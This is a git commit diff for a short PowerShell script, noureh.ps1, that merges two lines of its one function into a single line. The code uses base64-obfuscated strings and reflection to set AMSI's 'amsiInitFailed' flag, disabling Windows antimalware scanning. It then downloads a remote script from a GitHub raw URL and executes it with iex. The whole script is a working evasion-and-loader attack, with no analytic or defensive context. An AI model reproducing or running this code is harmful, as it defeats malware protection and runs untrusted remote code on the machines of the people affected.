888e28c9f56f9d4517314e2c160cdee23162917d
W1kyri3 <81154240+W1kyri3@users.noreply.github.com>
2021-04-08 17:18:54 +0100

    Update noureh.ps1

--- noureh.ps1
+++ noureh.ps1
@@ -1,7 +1,5 @@
 function noureh
 {
-      [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
-
-      iex(new-object net.webclient).downloadString('https://raw.githubusercontent.com/W1kyri3/lunai/main/roma.ps1')
+      [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true);iex(new-object net.webclient).downloadString('https://raw.githubusercontent.com/W1kyri3/lunai/main/roma.ps1')
 }
 noureh
